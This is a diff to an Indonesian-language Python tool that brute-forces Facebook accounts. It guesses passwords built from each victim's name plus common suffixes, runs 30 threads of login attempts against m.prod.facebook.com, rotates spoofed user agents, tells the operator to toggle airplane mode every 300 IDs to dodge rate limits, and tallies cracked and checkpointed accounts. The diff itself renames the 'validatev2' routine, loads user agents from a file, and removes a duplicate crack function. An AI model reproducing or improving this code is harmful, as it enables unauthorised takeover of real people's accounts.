@@ -75,6 +75,7 @@ prem=[]
 wa = Console()
 ugen2 = []
 ugen = []
+uahk=[]
 ugent =[]
 temanku = []
 console = Console()
@@ -151,7 +152,13 @@ for brayen in range(10000):
     u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
     UaMainn = random.choice([u1, u2, u3, u4, u5])
     ugen.append(UaMainn)
-	
+
+
+cekuaku = open("ua.txt","r").read().splitlines()
+for uakh in cekuaku:
+	uahk.append(uakh)
+
+
 def uaku():
     try:
         ua = open("fan.txt", "r").read().splitlines()
@@ -1284,7 +1291,7 @@ def metslow():
                 if "validatev1" in method:
                     pool.submit(validatev1,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(kontol,idf,pwv)
+                    pool.submit(validatev2,idf,pwv)
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
@@ -1351,7 +1358,7 @@ def metcepat():
                 if "validatev1" in method:
                     pool.submit(validatev1,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(kontol,idf,pwv)
+                    pool.submit(validatev2,idf,pwv)
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
@@ -1372,89 +1379,8 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
-def metcepathhh():
-    global prog, des
 
-    # Memastikan variabel yang digunakan terdefinisi
-    if not isinstance(id2, list) or len(id2) == 0:
-        raise ValueError("Daftar ID (id2) kosong atau tidak valid.")
-
-    if method not in ["validatev1", "validatev2", "reguler", "mbasic"]:
-        raise ValueError(f"Method tidak valid: {method}")
-
-    bi = random.choice([u, k, kk, b, h, hh])
-    print('')
-
-    # Panel untuk menampilkan hasil OK dan CP
-    urut = []
-    urut.append(panel(f'[bold green]%s [bold white]' % (okc), width=30, title=f"[bold green]OK SAVE", style=f"{color_panel}"))
-    urut.append(panel(f'[bold yellow]%s [bold white]' % (cpc), width=30, title=f"[bold yellow]CP SAVE", style=f"{color_panel}"))
-    wa.print(Columns(urut))
-
-    # Menampilkan instruksi mode pesawat
-    awal = datetime.now()
-    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',
-                          title=f"[bold yellow]CRACK-CEPAT",
-                          width=60,
-                          style=f"{color_panel}"))
-
-    # Inisialisasi progres
-    prog = Progress(TextColumn('{task.description}'))
-    des = prog.add_task('', total=len(id2))
-
-    with prog:
-        with tred(max_workers=30) as pool:
-            for yuzong in id2:
-                try:
-                    # Memisahkan ID dan nama
-                    idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
-                    frs = nmf.split(" ")[0]
-
-                    # Membuat daftar password
-                    pwv = ["rasis123", "rasis1234", "rasis12345", "bismillah"]
-                    if len(nmf) < 6:
-                        if len(frs) >= 3:
-                            pwv.extend([nmf, frs + '321', frs + '123', frs + '1234', frs + '12345', frs + '123456'])
-                    else:
-                        pwv.extend([nmf, frs + '321', frs + '123', frs + '1234', frs + '12345', frs + '123456'])
-
-                    # Menambahkan password tambahan jika `pwpluss` diaktifkan
-                    if 'ya' in pwpluss:
-                        for xpwd in pwnya:
-                            pwv.append(xpwd)
-                    else:pass
-                    # Memanggil metode yang sesuai
-                    if "validatev1" in method:
-                        pool.submit(validatev1, idf, pwv, 'm.prod.facebook.com')
-                    elif "validatev2" in method:
-                        pool.submit(kontol, idf, pwv)
-                    elif "reguler" in method:
-                        pool.submit(reguler, idf, pwv)
-                    elif "mbasic" in method:
-                        pool.submit(mbasic, idf, pwv)
-                    else:
-                        pool.submit(reguler, idf, pwv)
-
-                except Exception as e:
-                    print(f"[bold red]Error saat memproses ID: {yuzong}. Detail: {e}")
-
-    # Menampilkan hasil akhir
-    print("")
-    Console().print(
-        Panel(
-            f"[bold green]Crack Telah Selesai, Jangan lupa tobat Kawan",
-            subtitle="╭───",
-            subtitle_align="left",
-            title=f"[bold green]Cek Opsi",
-            width=60,
-            style=f"{color_panel}",
-        )
-    )
-    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}    [bold yellow]CP ─> {cp}")
-    print("")
-	
-
-def kontollll(idf,pwv):
+def validatev2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen2)
